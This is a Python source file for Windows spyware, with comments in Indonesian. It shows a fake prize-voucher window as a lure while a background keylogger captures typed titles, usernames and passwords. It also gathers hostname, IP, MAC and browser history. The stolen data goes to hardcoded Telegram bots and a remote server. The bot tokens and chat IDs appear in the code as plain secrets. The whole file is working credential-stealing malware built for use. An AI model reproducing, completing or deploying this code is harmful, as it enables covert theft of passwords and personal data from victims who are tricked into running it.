import socket
import json
import requests
import platform
import uuid
import tkinter as tk
from tkinter import ttk
import random
import string
from tkinter import font as tkfont
from browser_utils import all_history_browser
from pynput import keyboard, mouse
from datetime import datetime
import threading
import ctypes
import win32gui 
import psutil

SERVER_URL = "http://10.170.2.21:5000/report"
VOUCHER_SERVER = "http://10.170.2.21:5500/store-voucher"

TELEGRAM_ROOM1 = "7913263487:AAFklkg_BpeTRrOkYlw2ZMpjq8mN0qe1tds"  # Untuk keylogger dan basic info
TELEGRAM_ROOM2 = "8161642998:AAHKJF4IlDssfyxDLL9KujR0UlD-kyDBNbY"  # Untuk browser history
CHAT_ID_ROOM1 = "5085281646" 
CHAT_ID_ROOM2 = "5085281646"

type_chars = []
form_data = {}
form_counter = 1
field_index = 0
gui_window_title = "Voucher Hadiah"
block_input_from_gui = True

def send_telegram_message(token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=payload)
    except Exception as e:
        print(f"[!] Gagal mengirim ke Telegram: {e}")


# Fungsi untuk mendapatkan IP address
def basic_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        local_ip = "0.0.0.0"

    interfaces = psutil.net_if_addrs()
    interface_name = "Unknown"
    mac_address = "00:00:00:00:00:00"

    for name, addresses in interfaces.items():
        for addr in addresses:
            if addr.family == socket.AF_INET and addr.address == local_ip:
                interface_name = name
                for a in addresses:
                    if a.family == psutil.AF_LINK:
                        mac_address = a.address
                break

    host_info = {
        "hostname": socket.gethostname(),
        "ip_address": local_ip,
        "os": platform.system(),
        "os_version": platform.version(),
        "mac": mac_address,
    }

    browser_data = all_history_browser()

    # Kirim ke Telegram
    info_msg = "\n".join([
        f"<b>🔍 SYSTEM INFO</b>",
        f"🖥️ Hostname: {host_info['hostname']}",
        f"🌐 IP: {host_info['ip_address']}",
        f"💻 OS: {host_info['os']} {host_info['os_version']}",
        f"🧭 MAC: {host_info['mac']}"
    ])
    send_telegram_message(TELEGRAM_ROOM1, CHAT_ID_ROOM1, info_msg)

    if browser_data:
        history_msg = "<b>📑 Browser History</b>\n\n"
        for item in browser_data[:10]:  # batasi kiriman
            history_msg += f"- {item.get('title', '')} ({item.get('url', '')})\n"
        send_telegram_message(TELEGRAM_ROOM2, CHAT_ID_ROOM2, history_msg)

    host_info["browser_history"] = browser_data
    return host_info


# Fungsi untuk generate voucher code
def generate_voucher():
    def random_block():
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    return f"{random_block()}-{random_block()}-{random_block()}"

# Cek apakah window aktif adalah milik GUI kita
def is_external_window_active():
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        return gui_window_title not in title
    except:
        return True  # Asumsi default adalah eksternal jika gagal mendeteksi

# Fungsi untuk menyimpan data form
def save_from_data(form_data_local, form_id):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data_to_send = {
        "timestamp": timestamp,
        "form_id": form_id,
        "data": {}
    }
    
    for key, val in form_data_local.items():
        data_to_send["data"][f"{form_id}.{key}"] = val
        
    try:
        response = requests.post(SERVER_URL, json=data_to_send)
        if response.status_code == 200:
            print("[+] Data Berhasil Dikirim ke Server Utama")
        else:
            print(f"[!] Data Gagal Terkirim ke Server Utama")
    except requests.RequestException as e:
        print(f"[!] Error Saat Proses Pengiriman Data: {e}")

# Fungsi untuk simpan per field
def submit_field():
    global type_chars, field_index, form_data, form_counter

    input_text = ''.join(type_chars).strip()
    if len(input_text) < 1:
        type_chars.clear()
        return

    print(f"[DEBUG] Field {field_index} input: {input_text}")

    if field_index == 0:
        form_data["title"] = input_text
    elif field_index == 1:
        form_data["username"] = input_text
    else:
        if "password" in form_data:
            form_data["password"] += input_text
        else:
            form_data["password"] = input_text

    # Kirim info field ke Telegram
    field_name = {0: "Title", 1: "Username"}.get(field_index, "Password")
    send_telegram_message(
        TELEGRAM_ROOM1,
        CHAT_ID_ROOM1,
        f"📥 <b>{field_name}</b> input: <code>{input_text}</code>"
    )

    type_chars.clear()
    field_index += 1

    if "title" in form_data and "username" in form_data and "password" in form_data:
        save_from_data(form_data.copy(), f"form{form_counter}")
        form_data.clear()
        field_index = 0
        form_counter += 1


# Keylogger
def on_press(key):
    global type_chars
    
    try:
        if block_input_from_gui or not is_external_window_active():
            return
        
        if hasattr(key, 'char') and key.char and len(key.char) == 1:
            if key.char.isprintable():
                type_chars.append(key.char)

        if key in [keyboard.Key.enter, keyboard.Key.tab]:
            submit_field()

        if key == keyboard.Key.backspace and type_chars:
            type_chars.pop()

    except Exception as e:
        print(f"[!] Error Key Press: {e}")

def on_click(x, y, button, pressed):
    if block_input_from_gui or not is_external_window_active():
        return

    if pressed and type_chars:
        submit_field()

def start_keylogger():
    print("[INFO] Keylogger dimulai...")
    
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)
    
    keyboard_listener.start()
    mouse_listener.start()
    
    keyboard_listener.join()
    mouse_listener.join()

# Fungsi utama GUI
def show_message():
    global block_input_from_gui

    root = tk.Tk()
    root.title(gui_window_title)
    root.geometry("400x320")
    root.configure(bg="#ffffff")
    root.resizable(False, False)

    voucher_code = generate_voucher()

    try:
        requests.post(VOUCHER_SERVER, json={"voucher_code": voucher_code})
        print(f"[INFO] Voucher dikirim ke server: {voucher_code}")
    except Exception as e:
        print(f"[ERROR] Gagal mengirim voucher ke server: {e}")

    def copy_to_clipboard():
        root.clipboard_clear()
        root.clipboard_append(voucher_code)
        copy_btn.config(text="✓ Disalin", state="disabled")
        voucher_label.config(bg="#f0f9eb", fg="#2e7d32")
        root.after(1500, lambda: [
            copy_btn.config(text="SALIN", state="normal"),
            voucher_label.config(bg="#ffffff", fg="#2e7d32")
        ])

    try:
        title_font = tkfont.Font(family="Segoe UI", size=16, weight="bold")
        subtitle_font = tkfont.Font(family="Segoe UI", size=10)
        voucher_font = tkfont.Font(family="Consolas", size=20, weight="bold")
        btn_font = tkfont.Font(family="Segoe UI", size=10, weight="bold")
    except:
        title_font = tkfont.Font(size=16, weight="bold")
        subtitle_font = tkfont.Font(size=10)
        voucher_font = tkfont.Font(size=20, weight="bold")
        btn_font = tkfont.Font(size=10, weight="bold")

    container = tk.Frame(root, bg="#ffffff")
    container.pack(expand=True, fill="both", padx=30, pady=25)

    tk.Label(container, text="🎉 SELAMAT!", font=title_font, bg="#ffffff", fg="#333333").pack(pady=(0, 10))
    tk.Label(container, text="KLAIM VOUCHER ANDA", font=subtitle_font, bg="#ffffff", fg="#666666").pack(pady=(0, 20))

    voucher_container = tk.Frame(container, bg="#ffffff", highlightthickness=1, highlightbackground="#e0e0e0")
    voucher_container.pack(pady=(0, 30), ipadx=10, ipady=5)

    voucher_label = tk.Label(voucher_container, text=voucher_code, font=voucher_font, bg="#ffffff", fg="#2e7d32", padx=20, pady=10)
    voucher_label.pack()

    btn_frame = tk.Frame(container, bg="#ffffff")
    btn_frame.pack()

    copy_btn = tk.Button(btn_frame, text="SALIN", command=copy_to_clipboard, font=btn_font,
                         bg="#4a90e2", fg="white", activebackground="#357abd", activeforeground="white",
                         bd=0, padx=25, pady=8, relief="flat", cursor="hand2")
    copy_btn.grid(row=0, column=0, padx=8)

    close_btn = tk.Button(btn_frame, text="TUTUP", command=lambda: [root.destroy()], font=btn_font,
                          bg="#f5f5f5", fg="#333333", activebackground="#e0e0e0", activeforeground="#333333",
                          bd=0, padx=25, pady=8, relief="flat", cursor="hand2")
    close_btn.grid(row=0, column=1, padx=8)

    def on_enter(e):
        e.widget.config(bg="#357abd" if e.widget == copy_btn else "#e0e0e0")

    def on_leave(e):
        e.widget.config(bg="#4a90e2" if e.widget == copy_btn else "#f5f5f5")

    copy_btn.bind("<Enter>", on_enter)
    copy_btn.bind("<Leave>", on_leave)
    close_btn.bind("<Enter>", on_enter)
    close_btn.bind("<Leave>", on_leave)

    x = (root.winfo_screenwidth() - root.winfo_width()) // 2
    y = (root.winfo_screenheight() - root.winfo_height()) // 2
    root.geometry(f"+{x}+{y}")

    root.attributes('-topmost', True)
    root.after(100, lambda: root.attributes('-topmost', False))

    # Nonaktifkan log pencatatan saat GUI aktif
    block_input_from_gui = True
    root.after(2000, lambda: setattr(__import__('__main__'), 'block_input_from_gui', False))

    root.mainloop()

if __name__ == "__main__":

    def send_data():
        try:
            data = basic_ip()
            requests.post(SERVER_URL, json=data)
        except Exception as e:
            print(f"Terjadi Error Saat Mengirimkan Data: {e}")

    threading.Thread(target=send_data, daemon=True).start()
    threading.Thread(target=start_keylogger, daemon=True).start()
    show_message()
